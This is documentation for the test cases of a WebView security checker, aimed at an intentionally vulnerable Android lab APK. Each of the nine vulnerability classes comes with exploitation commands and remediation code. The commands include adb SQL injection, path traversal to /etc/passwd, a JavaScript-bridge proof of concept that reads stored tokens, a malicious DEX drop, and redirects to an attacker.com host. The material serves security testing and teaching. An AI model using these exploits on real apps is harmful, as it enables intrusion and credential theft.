# VulnLab Test Cases Documentation

## Integration Overview

Your WebView checker scripts now include **9 OWASP Mobile Top 10 vulnerability test cases** from the VulnLab repository (https://github.com/anpa1200/Vulnerable-APK).

These test cases complement the WebView-specific security checks with comprehensive vulnerability detection across the Android attack surface.

## Vulnerability Test Cases (11.1 - 11.9)

### 11.1 - Component Exposure & Insecure IPC
**CVSS Score:** 9.1 (Critical)

**Description:** 
Exported Activity without proper permissions allowing unauthorized access

**What it detects:**
- Activities exported without explicit permission protection
- Intent filters that expose components globally
- Missing android:exported attribute

**Test Keywords:**
- `exported`
- `activity`
- `intent-filter`
- `android:exported`

**Exploitation Example:**
```bash
adb shell am start -n com.vulnlab.insecureapp/.AdminActivity \
    --ez isAdmin true --es action deleteAll
```

**Remediation:**
```xml
<activity 
    android:name=".AdminActivity"
    android:exported="false" />
```

---

### 11.2 - Intent Redirection & PendingIntent Misuse
**CVSS Score:** 8.3 (High)

**Description:**
Intent redirection to arbitrary URLs via deep links or PendingIntent vulnerabilities

**What it detects:**
- Unvalidated intent data that leads to redirects
- Improper PendingIntent flag configuration
- Missing intent data validation

**Test Keywords:**
- `intent-filter`
- `scheme`
- `PendingIntent`
- `redirect`

**Exploitation Examples:**
```bash
# Intent Redirection
adb shell am start -a android.intent.action.VIEW \
    -d "vulnlab://redirect?url=http://attacker.com"

# PendingIntent Misuse
adb shell am broadcast -a com.vulnlab.insecureapp.TRIGGER_INTENT
```

**Remediation:**
```java
// For PendingIntent - use FLAG_IMMUTABLE (API 23+)
PendingIntent.getActivity(context, 0, intent, 
    PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);

// For Intent Redirection - validate all data
Uri data = getIntent().getData();
if (data != null && isValidUrl(data.toString())) {
    // proceed
}
```

---

### 11.3 - ContentProvider SQL Injection & Path Traversal
**CVSS Score:** 9.8 (Critical)

**Description:**
SQL injection in ContentProvider queries or path traversal allowing file access

**What it detects:**
- Unsafe query() method implementations
- Direct string concatenation in SQL queries
- Improper file path validation

**Test Keywords:**
- `ContentProvider`
- `query`
- `selection`
- `File`

**Exploitation Examples:**
```bash
# SQL Injection
adb shell content query --uri content://com.vulnlab.insecureapp.provider/users \
    --where "1=1 UNION SELECT key,value,null,null,null FROM secrets--"

# Path Traversal
adb shell content query --uri \
    content://com.vulnlab.insecureapp.provider/files/../../../etc/passwd
```

**Remediation:**
```java
// Use parameterized queries
SQLiteDatabase db = getDatabase();
Cursor cursor = db.query(
    "users",
    new String[]{"id", "name"},
    "id=?",           // WHERE clause with placeholder
    new String[]{id}, // Arguments
    null, null, null
);

// For file access - validate paths
File file = new File(userPath);
String canonical = file.getCanonicalPath();
if (!canonical.startsWith(baseDir.getCanonicalPath())) {
    throw new SecurityException("Path traversal detected");
}
```

---

### 11.4 - Deep Link Parameter Injection & OAuth Token Hijacking
**CVSS Score:** 8.1 (High)

**Description:**
Deep links accepting untrusted parameters leading to injection attacks or OAuth token theft

**What it detects:**
- Vulnerable deep link handling
- Improper OAuth state parameter validation
- Unvalidated redirect URI handling

**Test Keywords:**
- `deep-link`
- `android:scheme`
- `android:host`
- `oauth`

**Exploitation Examples:**
```bash
# Deep Link Parameter Injection
adb shell am start -a android.intent.action.VIEW \
    -d "vulnlab://app/reset?token=INJECTED_TOKEN"

# OAuth Token Hijacking
adb shell am start -a android.intent.action.VIEW \
    -d "vulnlab://oauth?code=STOLEN_CODE&state=INJECTED"
```

**Remediation:**
```java
// Validate all deep link parameters
Uri data = getIntent().getData();
if (data != null) {
    String token = data.getQueryParameter("token");
    
    // Validate token format and origin
    if (!isValidToken(token)) {
        finish();
        return;
    }
}

// For OAuth - validate state parameter
String state = data.getQueryParameter("state");
if (!validateOAuthState(state)) {
    throw new SecurityException("Invalid OAuth state");
}
```

---

### 11.5 - Broadcast Receiver Hijack
**CVSS Score:** 7.4 (High)

**Description:**
Unprotected BroadcastReceiver allowing configuration hijacking and man-in-the-middle attacks

**What it detects:**
- Unprotected BroadcastReceiver implementations
- Receivers without permission requirements
- Missing receiver protection

**Test Keywords:**
- `BroadcastReceiver`
- `intent-filter`
- `onReceive`

**Exploitation Example:**
```bash
adb shell am broadcast -n com.vulnlab.insecureapp/.ConfigReceiver \
    --es server_url "http://attacker.com" \
    --ez force_update true
```

**Remediation:**
```xml
<!-- Option 1: Require Permission -->
<receiver
    android:name=".ConfigReceiver"
    android:permission="com.vulnlab.RECEIVE_CONFIG"
    android:exported="true">
    <intent-filter>
        <action android:name="com.vulnlab.BROADCAST_CONFIG" />
    </intent-filter>
</receiver>

<!-- Option 2: Use LocalBroadcastManager -->
LocalBroadcastManager manager = LocalBroadcastManager.getInstance(this);
manager.registerReceiver(receiver, new IntentFilter("ACTION"));
```

---

### 11.6 - Insecure Data Storage
**CVSS Score:** 7.5 (High)

**Description:**
Sensitive data stored without encryption in SharedPreferences or files, accessible via debuggable flag

**What it detects:**
- Unencrypted SharedPreferences usage
- World-readable file permissions
- Sensitive data in external storage
- Debuggable flag enabled

**Test Keywords:**
- `SharedPreferences`
- `MODE_WORLD_READABLE`
- `getSharedPreferences`

**Exploitation Example:**
```bash
# Read unencrypted SharedPreferences
adb shell run-as com.vulnlab.insecureapp \
    cat /data/data/com.vulnlab.insecureapp/shared_prefs/vulnlab_prefs.xml

# Read SQLite database
adb shell run-as com.vulnlab.insecureapp \
    sqlite3 /data/data/com.vulnlab.insecureapp/databases/vulnlab.db .dump

# Read external storage
adb shell cat /sdcard/Android/data/com.vulnlab.insecureapp/files/session.json
```

**Remediation:**
```java
// Use EncryptedSharedPreferences
try {
    MasterKey masterKey = new MasterKey.Builder(context)
        .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
        .build();
    
    SharedPreferences prefs = EncryptedSharedPreferences.create(
        context,
        "secret_shared_prefs",
        masterKey,
        EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
        EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
    );
    
    prefs.edit().putString("secret_token", token).apply();
} catch (Exception e) {
    // Handle error
}
```

---

### 11.7 - Cryptography Failures
**CVSS Score:** 7.5 (High)

**Description:**
Hardcoded cryptographic keys, weak algorithms (MD5, ECB), static IVs, or predictable random number generation

**What it detects:**
- Hardcoded encryption keys
- Use of weak algorithms (DES, MD5)
- ECB mode usage (deterministic encryption)
- Weak random number generation
- Static initialization vectors

**Test Keywords:**
- `Cipher`
- `ECB`
- `MD5`
- `DES`
- `hardcoded`

**Exploitation Example:**
```bash
adb shell am start -n com.vulnlab.insecureapp/.CryptoActivity
adb logcat | grep VulnLab:Crypto
# Output shows: hardcoded AES key, ECB ciphertext, static IV, MD5 hash, weak RNG
```

**Remediation:**
```java
// Secure Encryption with AES-GCM
SecureRandom random = new SecureRandom();
byte[] iv = new byte[12]; // 96-bit IV for GCM
random.nextBytes(iv);

Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
SecretKeySpec keySpec = new SecretKeySpec(derivedKey, 0, 32, "AES");
GCMParameterSpec gcmSpec = new GCMParameterSpec(128, iv);

cipher.init(Cipher.ENCRYPT_MODE, keySpec, gcmSpec);
byte[] ciphertext = cipher.doFinal(plaintext);

// Store iv + ciphertext
byte[] combined = new byte[iv.length + ciphertext.length];
System.arraycopy(iv, 0, combined, 0, iv.length);
System.arraycopy(ciphertext, 0, combined, iv.length, ciphertext.length);
```

---

### 11.8 - Insecure WebView + JS Bridge
**CVSS Score:** 9.3 (Critical)

**Description:**
WebView with enabled JavaScript and exposed JavaScript bridge (addJavascriptInterface) allowing RCE

**What it detects:**
- JavaScript enabled in WebView
- JavaScript bridge exposed to web content
- Insecure WebView client implementations
- File access to WebView
- Unvalidated URL loading

**Test Keywords:**
- `WebView`
- `addJavascriptInterface`
- `setJavaScriptEnabled`
- `loadUrl`

**Exploitation Example:**
```bash
# Create malicious HTML
cat > /tmp/poc.html << 'EOF'
<script>
  var cmd = Android.execCommand("id");
  var prefs = Android.readFile("/data/data/com.vulnlab.insecureapp/shared_prefs/vulnlab_prefs.xml");
  var token = Android.getAuthToken();
  document.body.innerHTML = "<pre>CMD: "+cmd+"\nPREFS:\n"+prefs+"\nTOKEN: "+token+"</pre>";
</script>
EOF

# Push and load in WebView
adb push /tmp/poc.html /data/local/tmp/poc.html
adb shell run-as com.vulnlab.insecureapp \
    cp /data/local/tmp/poc.html \
       /data/data/com.vulnlab.insecureapp/files/poc.html
adb shell am start -n com.vulnlab.insecureapp/.WebViewActivity \
    --es url "file:///data/data/com.vulnlab.insecureapp/files/poc.html"
```

**Remediation:**
```java
WebView webView = findViewById(R.id.webview);
WebSettings settings = webView.getSettings();

// Disable JavaScript if not needed
settings.setJavaScriptEnabled(false);

// OR if JavaScript is required:
// 1. Disable file access
settings.setAllowFileAccess(false);
settings.setAllowContentAccess(false);

// 2. Never use addJavascriptInterface()
// 3. Only load HTTPS content
// 4. Implement strict WebViewClient
webView.setWebViewClient(new WebViewClient() {
    @Override
    public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
        if (!request.getUrl().getScheme().equals("https")) {
            return true; // Block non-HTTPS
        }
        return false;
    }
});
```

---

### 11.9 - Dynamic Code Loading
**CVSS Score:** 8.8 (Critical)

**Description:**
Dynamic code loading from untrusted sources without signature verification, allowing arbitrary code execution

**What it detects:**
- DexClassLoader usage
- Plugin loading mechanisms
- Dynamic class instantiation
- Code loading from external storage
- Missing code signature verification

**Test Keywords:**
- `DexClassLoader`
- `loadClass`
- `Plugin`
- `ClassLoader`

**Exploitation Example:**
```bash
# Build malicious DEX implementing com.vulnlab.plugin.UpdatePlugin
# Then drop it at the watched path
adb shell mkdir -p /sdcard/vulnlab_plugins
adb push malicious.dex /sdcard/vulnlab_plugins/update.dex

# Trigger plugin loading
adb shell am start -n com.vulnlab.insecureapp/.DynamicCodeActivity
```

**Remediation:**
```java
// NEVER do this:
// DexClassLoader loader = new DexClassLoader(externalPath, ...);

// Instead: Use static code only
// If plugins are absolutely required:

// 1. Verify signature
private boolean verifyDEXSignature(File dexFile) {
    try {
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        FileInputStream fis = new FileInputStream(dexFile);
        byte[] buffer = new byte[8192];
        int bytesRead;
        while ((bytesRead = fis.read(buffer)) != -1) {
            md.update(buffer, 0, bytesRead);
        }
        fis.close();
        
        String hash = bytesToHex(md.digest());
        return KNOWN_GOOD_HASHES.contains(hash);
    } catch (Exception e) {
        return false;
    }
}

// 2. Load only from app's private directory
File appsDir = new File(getFilesDir(), "plugins");
if (!dexFile.getParentFile().equals(appsDir)) {
    throw new SecurityException("Invalid plugin path");
}

// 3. Use restricted ClassLoader
DexClassLoader loader = new DexClassLoader(
    dexFile.getAbsolutePath(),
    getCacheDir().getAbsolutePath(),
    null,
    ClassLoader.getSystemClassLoader());
```

---

## Running Tests Against VulnLab APK

Download and test against the intentionally vulnerable APK:

```bash
# Get the VulnLab APK
wget https://github.com/anpa1200/Vulnerable-APK/releases/download/v1.0/VulnLab.apk

# Run WebView checker with VulnLab test cases
python check_webview.py VulnLab.apk -v

# Get detailed JSON report
python check_webview.py VulnLab.apk --json > vulnlab_report.json

# Run advanced analysis
python check_webview_advanced.py VulnLab.apk -v --apktool

# Generate Frida hooks for testing
python example_workflow.py VulnLab.apk -a --generate-hooks vulnlab_hooks.js
```

## Expected Results for VulnLab APK

When running against VulnLab.apk, you should detect:
- ✓ **11.1** - Component Exposure (AdminActivity exported)
- ✓ **11.2** - Intent Redirection (IntentRedirectReceiver)
- ✓ **11.3** - SQL Injection (VulnContentProvider)
- ✓ **11.4** - Deep Link Injection (DeepLinkActivity)
- ✓ **11.5** - Broadcast Hijack (ConfigReceiver)
- ✓ **11.6** - Insecure Storage (SharedPreferences, world-readable)
- ✓ **11.7** - Crypto Failures (hardcoded keys, ECB mode)
- ✓ **11.8** - WebView JS Bridge (addJavascriptInterface enabled)
- ✓ **11.9** - Dynamic Code Loading (DexClassLoader usage)

## Integration with Your Testing Framework

The test cases integrate seamlessly with your Frida automation:

```python
from example_workflow import FridaWebViewWorkflow

# Analyze APK
workflow = FridaWebViewWorkflow("app.apk")
workflow.run_webview_check()

# Get vulnerability findings
vulns = workflow.check_webview_vulnerabilities()

# Generate test hooks based on vulnerabilities
workflow.create_frida_script("test_hooks.js")

# Use with Frida
# frida -U -f com.example.app -l test_hooks.js
```

## References

- **VulnLab Repository:** https://github.com/anpa1200/Vulnerable-APK
- **OWASP Mobile Top 10:** https://owasp.org/www-project-mobile-top-10/
- **Android Security Documentation:** https://developer.android.com/privacy-and-security
- **CWE Top 25 Mobile:** https://cwe.mitre.org/

## Testing Checklist

- [ ] Download and analyze VulnLab.apk
- [ ] Verify all 9 vulnerability types are detected
- [ ] Review JSON output for completeness
- [ ] Generate Frida hooks successfully
- [ ] Test against your own applications
- [ ] Validate remediation code samples
- [ ] Document findings in security reports

---

**Last Updated:** May 11, 2026
**VulnLab Version:** Compatible with v1.0+
